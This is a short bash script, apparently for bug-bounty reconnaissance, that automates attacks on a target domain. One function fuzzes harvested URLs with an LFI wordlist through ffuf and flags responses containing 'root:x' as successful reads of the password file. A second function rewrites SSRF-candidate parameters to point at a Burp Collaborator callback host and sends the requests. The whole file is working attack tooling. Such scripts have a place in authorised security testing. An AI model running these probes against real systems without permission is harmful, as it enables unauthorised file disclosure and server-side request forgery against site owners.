#!/bin/bash


domain=$1
domain_lfi(){
mkdir -p $domain/recon/LFI  $domain/recon/ssrf
cat $domain/recon/gf/lfi.txt |qsreplace FUZZ |while read url;do ffuf -u $url -mr "root:x" -w /home/deathpool/wordlist/LFI.txt -o $domain/recon/LFI/result.txt ;done
}
domain_lfi

domain_ssrf(){
echo "PLEASE CHANGE BURP COLLABIRATER URL"
cat $domain/recon/gf/ssrf.txt | qsreplace http://uwuns4yiioxg3ype5s394ytw9nfd32.burpcollaborator.net >> $domain/recon/ssrf/replaced.txt
ffuf -c -w $domain/recon/ssrf/replaced.txt -u FUZZ
}
domain_ssrf
